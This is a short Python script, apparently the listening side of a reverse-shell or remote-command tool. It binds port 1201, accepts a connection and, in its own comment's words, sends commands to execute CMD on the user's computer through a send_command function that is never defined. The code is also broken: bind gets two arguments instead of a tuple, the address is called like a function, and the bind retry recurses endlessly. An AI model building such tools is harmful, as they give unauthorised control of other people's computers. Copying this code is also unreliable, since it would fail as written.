import socket
import sys

# Creating socket to connect 2 computers
def making_socket():
    try:
        global host
        global port
        global s
        host =""
        port = 1201
        s= socket.socket() 
    
    except socket.error as msg:
        print("Socket creation error" + str(msg))

# Binding the socket and listening for connecting
def bind_the_socket():
    try:        
        global host
        global port
        global s

        print("Port binding" + str(port))

        s.bind(host,port)
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\n" + "Retrying...")
        bind_the_socket()

# Accept connection after listening

def astablishing_socket():
    
    # Storing data info
    conn,address = s.accept()
    print("Connection successfully established.\n" + "IP" + address(0) + "Port" + str(address(1)))
    
    # Sending the command to user's computer to execute CMD on their computer
    send_command(conn)
    conn.close()